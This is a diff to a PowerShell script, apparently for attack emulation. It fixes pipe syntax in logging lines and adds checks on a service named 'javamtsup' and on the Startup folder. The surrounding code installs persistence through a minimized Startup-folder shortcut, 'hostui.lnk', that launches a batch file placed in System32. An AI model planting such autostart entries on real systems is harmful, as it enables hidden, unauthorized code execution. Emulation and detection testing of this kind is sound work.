@@ -44,7 +44,7 @@ try {
 
 }
 
-'Creating startup link ..' | | Out-File -FilePath c:\temp\persistence.txt -Append
+'Creating startup link ..' | Out-File -FilePath c:\temp\persistence.txt -Append
  
 $Path = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\hostui.lnk"
 $TargetPath = "C:\Windows\System32\hostui.bat"
@@ -57,9 +57,11 @@ $Shortcut.WindowStyle = 7
 $Shortcut.IconLocation = $Icon
 $Shortcut.Save() 
 
-'PERSISTENCE done ..' | | Out-File -FilePath c:\temp\persistence.txt -Append
+'PERSISTENCE done ..' | Out-File -FilePath c:\temp\persistence.txt -Append
 
+get-service -Name javamtsup | Out-File -FilePath c:\temp\persistence.txt -Append
 
+dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"  | Out-File -FilePath c:\temp\persistence.txt -Append
 
 
 
